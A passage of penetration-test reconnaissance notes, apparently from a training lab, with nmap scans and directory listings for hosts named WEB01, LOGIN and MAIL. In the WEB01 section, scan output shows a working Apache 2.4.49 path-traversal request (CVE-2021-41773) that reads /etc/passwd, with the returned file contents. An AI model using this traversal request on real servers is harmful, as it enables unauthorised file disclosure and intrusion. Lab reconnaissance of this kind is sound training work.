| UpSxCGToYe5JULiNpnBpTWPEldc608y2jhpJpsH5UGifvRp/VpHW/3A+9t8oAUeN
| /SVW3bQ7sLEEvCmHH4E1uJS3k6kBidDY1A9OOxaL0k2v/cB8PONnEMwP4DcmKRA1
| cVrgXiR8x7E5zcVUPj8cM5+DqSOQTAphAcVbVx2c/K2XMENFZqVUbRFbuZSXVExp
| TQICNlWeutzCZGE7rREsIUUIigT9erEAvTu28RI=
|_-----END CERTIFICATE-----
2222/tcp open  ssh      syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:2d:8d:48:ad:10:dd:ff:70:25:8b:46:2e:5c:ff:1d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpVNr/0MSfOq95rNQVnUXG+NF7yHDkPeFEXylLHxnZSqLAEqWi+z67gxHF0QVSjtaeEVbOnind7C3LKLGe1b8g=
|   256 aa:4a:c3:27:b1:19:30:d7:63:91:96:ae:63:3c:07:dc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFcUmhqn+iJNZi0wDswh/Jusg6ZX0SGGoKcsNCB69vQA
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/18%OT=80%CT=%CU=32802%PV=Y%DS=4%DC=T%G=N%TM=68A34279
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=F6%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578ST11N
OS:W7%O6=M578ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
OS:=Y%DF=Y%T=40%W=FAF0%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

```
### feroxbuster
```
http://192.168.146.246/js/scripts.js
http://192.168.146.246/js/jquery-1.12.4.min.js
http://192.168.146.246/css/bootstrap.min.css
http://192.168.146.246/
http://192.168.146.246/fonts/glyphicons-halflings-regular.woff
http://192.168.146.246/submit/
```
## 245  WEB01
### open ports
```
Open 192.168.102.245:21
Open 192.168.102.245:80
Open 192.168.102.245:443
Open 192.168.102.245:8000
```
### port details
```
PORT     STATE SERVICE  REASON         VERSION
21/tcp   open  ftp      syn-ack ttl 61 vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.233
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http     syn-ack ttl 61 Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| cve-2021-41773: Target is VULNERABLE to CVE-2021-41773
| Request URL: http://192.168.102.245:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
| Status: 200
| Sample response:
| root:x:0:0:root:/root:/bin/bash
| daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
| bin:x:2:2:bin:/bin:/usr/sbin/nologin
| sys:x:3:3:sys:/dev:/usr/sbin/nologin
| sync:x:4:65534:sync:/bin:/bin/sync
|_games:x:5:6
|_http-title: RELIA Corp.
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
| CVE-2021-41773: 
|   VULNERABLE:
|   Apache 2.4.49 - Path Traversal
|     State: VULNERABLE
|     IDs:  CVE:CVE-2021-41773
|     Risk factor: HIGH
|                   A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. 
|                   An attacker could use a path traversal attack to map URLs to files outside the expected document root. 
|                   If files outside of the document root are not protected by "require all denied" these requests can succeed. 
|                   Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
|       
|               
|     Disclosure date: 2021-10-05
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2021-41773
|       https://twitter.com/h4x0r_dz/status/1445401960371429381
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
443/tcp  open  ssl/http syn-ack ttl 61 Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
| cve-2021-41773: Target is VULNERABLE to CVE-2021-41773
| Request URL: http://192.168.102.245:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
| Status: 200
| Sample response:
| root:x:0:0:root:/root:/bin/bash
| daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
| bin:x:2:2:bin:/bin:/usr/sbin/nologin
| sys:x:3:3:sys:/dev:/usr/sbin/nologin
| sync:x:4:65534:sync:/bin:/bin/sync
|_games:x:5:6
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE/localityName=Munich/organizationalUnitName=IT Department
| Issuer: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE/localityName=Munich/organizationalUnitName=IT Department
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-10-12T08:55:44
| Not valid after:  2032-10-09T08:55:44
| MD5:   fa8f:53d5:841c:47dc:ac0c:8d5a:3acb:43a7
| SHA-1: 9fd6:3372:2dfd:ed09:0915:6b60:2604:b238:f02a:eab7
| -----BEGIN CERTIFICATE-----
| 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
|_-----END CERTIFICATE-----
|_http-title: RELIA Corp.
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
|_ssl-date: TLS randomness does not represent time
| CVE-2021-41773: 
|   VULNERABLE:
|   Apache 2.4.49 - Path Traversal
|     State: VULNERABLE
|     IDs:  CVE:CVE-2021-41773
|     Risk factor: HIGH
|                   A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. 
|                   An attacker could use a path traversal attack to map URLs to files outside the expected document root. 
|                   If files outside of the document root are not protected by "require all denied" these requests can succeed. 
|                   Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
|       
|               
|     Disclosure date: 2021-10-05
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2021-41773
|       https://twitter.com/h4x0r_dz/status/1445401960371429381
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
8000/tcp open  http     syn-ack ttl 61 Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
|_http-open-proxy: Proxy might be redirecting requests
| cve-2021-41773: Target is VULNERABLE to CVE-2021-41773
| Request URL: http://192.168.102.245:8000/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
| Status: 200
| Sample response:
| root:x:0:0:root:/root:/bin/bash
| daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
| bin:x:2:2:bin:/bin:/usr/sbin/nologin
| sys:x:3:3:sys:/dev:/usr/sbin/nologin
| sync:x:4:65534:sync:/bin:/bin/sync
|_games:x:5:6
| CVE-2021-41773: 
|   VULNERABLE:
|   Apache 2.4.49 - Path Traversal
|     State: VULNERABLE
|     IDs:  CVE:CVE-2021-41773
|     Risk factor: HIGH
|                   A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. 
|                   An attacker could use a path traversal attack to map URLs to files outside the expected document root. 
|                   If files outside of the document root are not protected by "require all denied" these requests can succeed. 
|                   Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
|       
|               
|     Disclosure date: 2021-10-05
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2021-41773
|       https://twitter.com/h4x0r_dz/status/1445401960371429381
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/18%OT=21%CT=%CU=38926%PV=Y%DS=4%DC=T%G=N%TM=68A342D5
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578ST11N
OS:W7%O6=M578ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
OS:=Y%DF=Y%T=40%W=FAF0%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)
```

### feroxbuster
```
http://192.168.146.245/js/scripts.js
http://192.168.146.245/img/clients/client-3.png
http://192.168.146.245/img/clients/logo-3-dark.png
http://192.168.146.245/img/clients/logo-7-dark.png
http://192.168.146.245/img/clients/logo-2-dark.png
http://192.168.146.245/img/clients/logo-8-dark.png
http://192.168.146.245/js/plugins/waypoints.min.js
http://192.168.146.245/img/clients/logo-1-dark.png
http://192.168.146.245/img/clients/logo-11-dark.png
http://192.168.146.245/img/assets/logo-white.png
http://192.168.146.245/css/colors/green.css
http://192.168.146.245/js/plugins/wow.min.js
http://192.168.146.245/img/clients/client-2.png
http://192.168.146.245/img/clients/logo-9-dark.png
http://192.168.146.245/img/clients/logo-6-dark.png
http://192.168.146.245/js/plugins/counterup.min.js
http://192.168.146.245/js/plugins/smoothscroll.min.js
http://192.168.146.245/img/clients/logo-5-dark.png
http://192.168.146.245/js/plugins/parallax.min.js
http://192.168.146.245/css/simple-line-icons.css
http://192.168.146.245/css/owl.carousel.css
http://192.168.146.245/js/plugins/easign1.3.min.js
http://192.168.146.245/img/clients/logo-10-dark.png
http://192.168.146.245/js/plugins/tweetie.min.js
http://192.168.146.245/img/assets/logo-dark.png
http://192.168.146.245/css/no-ui-slider/jquery.nouislider.css
http://192.168.146.245/img/clients/logo-4-dark.png
http://192.168.146.245/js/plugins/gmap3.min.js
http://192.168.146.245/img/clients/client-1.png
http://192.168.146.245/js/no-ui-slider/jquery.nouislider.all.min.js
http://192.168.146.245/js/plugins/moderniz.min.js
http://192.168.146.245/css/font-awesome/css/font-awesome.css
http://192.168.146.245/bootstrap/js/bootstrap.min.js
http://192.168.146.245/img/assets/gridtile.png
http://192.168.146.245/img/assets/marker.png
http://192.168.146.245/img/assets/cbp-sprite.png
http://192.168.146.245/img/assets/contact-form-loader.gif
http://192.168.146.245/img/assets/cbp-loading-popup.gif
http://192.168.146.245/js/plugins/owlcarousel.min.js
http://192.168.146.245/img/assets/cbp-loading.gif
http://192.168.146.245/img/assets/gridtile_white.png
http://192.168.146.245/img/assets/timer.png
http://192.168.146.245/js/plugins/cubeportfolio.min.js
http://192.168.146.245/js/plugins/jquery.min.js
http://192.168.146.245/img/backgrounds/bg-9.jpg
http://192.168.146.245/bootstrap/css/bootstrap.min.css
http://192.168.146.245/css/ionicons.min.css
http://192.168.146.245/css/style.css
http://192.168.146.245/css/animate.css
http://192.168.146.245/css/revolution-slider.css
http://192.168.146.245/css/cubeportfolio.min.css
http://192.168.146.245/img/assets/rev-loader.GIF
http://192.168.146.245/img/backgrounds/bg-5.jpg
http://192.168.146.245/img/backgrounds/bg-4.jpg
http://192.168.146.245/img/backgrounds/bg-6.jpg
http://192.168.146.245/img/backgrounds/bg-7.jpg
http://192.168.146.245/img/team/team-2.png
http://192.168.146.245/img/backgrounds/bg-8.jpg
http://192.168.146.245/js/plugins/revslider.min.js
http://192.168.146.245/img/team/team-3.png
http://192.168.146.245/img/team/team-4.png
http://192.168.146.245/img/backgrounds/bg-2.jpg
http://192.168.146.245/img/backgrounds/bg.jpg
http://192.168.146.245/
http://192.168.146.245/fonts/ionicons.woff
http://192.168.146.245/img/backgrounds/bg-1.jpg
http://192.168.146.245/img/team/team-1.png
http://192.168.146.245/img/backgrounds/bg-3.jpg
http://192.168.146.245/fonts/Simple-Line-Icons.woff2
http://192.168.146.245/img/backgrounds/bg-shortcodes.jpg
http://192.168.146.245/img/backgrounds/bg-home-fullscreen.jpg
http://192.168.146.245/fonts/Simple-Line-Icons.woff
http://192.168.146.245/fonts/Simple-Line-Icons.ttf
http://192.168.146.245/fonts/ionicons.ttf
http://192.168.146.245/fonts/Simple-Line-Icons.svg
http://192.168.146.245/fonts/Simple-Line-Icons.eot
http://192.168.146.245/fonts/ionicons.svg
http://192.168.146.245/fonts/ionicons.eot
```
## 191 LOGIN
### open ports
```
Open 192.168.102.191:80
Open 192.168.102.191:135
Open 192.168.102.191:139
Open 192.168.102.191:445
Open 192.168.102.191:3389
Open 192.168.102.191:5985
Open 192.168.102.191:47001
Open 192.168.102.191:49664
Open 192.168.102.191:49667
Open 192.168.102.191:49665
Open 192.168.102.191:49666
Open 192.168.102.191:49670
Open 192.168.102.191:49668
Open 192.168.102.191:49671
Open 192.168.102.191:49669
```
### port details
```
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=192.168.102.191
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
|_ssl-date: 2025-08-18T15:14:20+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: LOGIN
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: login.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-18T15:14:11+00:00
| ssl-cert: Subject: commonName=login.relia.com
| Issuer: commonName=login.relia.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-17T15:04:17
| Not valid after:  2026-02-16T15:04:17
| MD5:   f8d4:5525:0507:2c20:d3ed:9345:c45e:d822
| SHA-1: d078:4d0d:5de3:2ecc:dc57:8be1:0609:393f:5547:f15c
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQGKu/++KA1qFO3d4QU7LcvjANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9sb2dpbi5yZWxpYS5jb20wHhcNMjUwODE3MTUwNDE3WhcNMjYw
| MjE2MTUwNDE3WjAaMRgwFgYDVQQDEw9sb2dpbi5yZWxpYS5jb20wggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQC9MtAZoO6MR6cGUMT2xXcbEw5xuHns2dsI
| ZYNRfK1qx2QJQD9K3I30nDQ5rCDcggOSXLDpquz77XxuVSdn97qtPOhJ6CxGcHma
| QM6mrM3ngIpjTCM3Xhzfv7FfGv6FnZEP0e3AcDZ3KHoRnsYwKi5BJkJCxobyWs2Y
| +zPftXMJoyy7/3P5C/nc3WvZ60U6selycddB1ZLsJ1tGVFFOIksTcUhaQ7k3xDx2
| M4wYmQeZyasy+6WOvfXyPYVwltiuvtIet9pH8HxT5Dk6uiYgrHqYrB/4EwzOZr+y
| ACHK9h/FvpMsdspkEQphH+ARvUaP0d11TK5pguHGl+e2Z4kdA7r5AgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAIBIu7RpWTyek+JxXg/KATcf9v8zL2kMHiJP5m6GMvrRqyNTaFVX48ODa
| k8XWLz7YfmX2cWeRo11cQrWwhIHow8T7yD3Ob2gmjuqRoNI07Gbv0FzePNssTJ5J
| ux6q3Uz8fJJg6WSLehF+JZxIlsBsk/uBarG9mayoVlvE9JlB+R5TMVBzpBXoyp6F
| mDu8o51Bpr/CHA2KQ99xd32vQ8FqyPa+QTcMO18Y2y3BRRBBCyUSkPyXGfg4ndkk
| wokludAgpWhsom2INoaEOcrO+fdBIRVq+ZWuty72GmaFpdlgswNPwoRyJDyGwvV0
| Y91qR+va3MzHyFx7JwwS6xBESebrHQ==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (92%), Microsoft Windows 10 1607 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Microsoft Windows Server 2012 Data Center (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/18%OT=80%CT=%CU=43691%PV=Y%DS=4%DC=T%G=N%TM=68A3434C%P=x86_64-pc-linux-gnu)
SEQ()
SEQ(SP=107%GCD=1%ISR=106%TI=I%CI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=N)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=N)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=N)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2025-08-18T15:14:13
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52887/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 31639/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 12812/udp): CLEAN (Timeout)
|   Check 4 (port 22119/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```
### feroxbuster
```
```
## 189 MAIL
### open ports
```
Open 192.168.102.189:25
Open 192.168.102.189:110
Open 192.168.102.189:135
Open 192.168.102.189:139
Open 192.168.102.189:143
Open 192.168.102.189:445
Open 192.168.102.189:587
Open 192.168.102.189:5985
Open 192.168.102.189:47001
Open 192.168.102.189:49664
Open 192.168.102.189:49666
Open 192.168.102.189:49665
Open 192.168.102.189:49667
Open 192.168.102.189:49668
Open 192.168.102.189:49670
Open 192.168.102.189:49669
```
### port details
```
PORT      STATE SERVICE       REASON          VERSION
25/tcp    open  smtp          syn-ack ttl 125 hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp   open  pop3          syn-ack ttl 125 hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
143/tcp   open  imap          syn-ack ttl 125 hMailServer imapd
|_imap-capabilities: OK completed SORT RIGHTS=texkA0001 CHILDREN QUOTA IMAP4 CAPABILITY NAMESPACE IMAP4rev1 IDLE ACL
445/tcp   open  microsoft-ds? syn-ack ttl 125
587/tcp   open  smtp          syn-ack ttl 125 hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1607 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/18%OT=25%CT=%CU=35363%PV=Y%DS=4%DC=T%G=N%TM=68A343EA%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10C%TI=I%CI=I%TS=A)
SEQ(SP=102%GCD=1%ISR=10A%TI=I%CI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
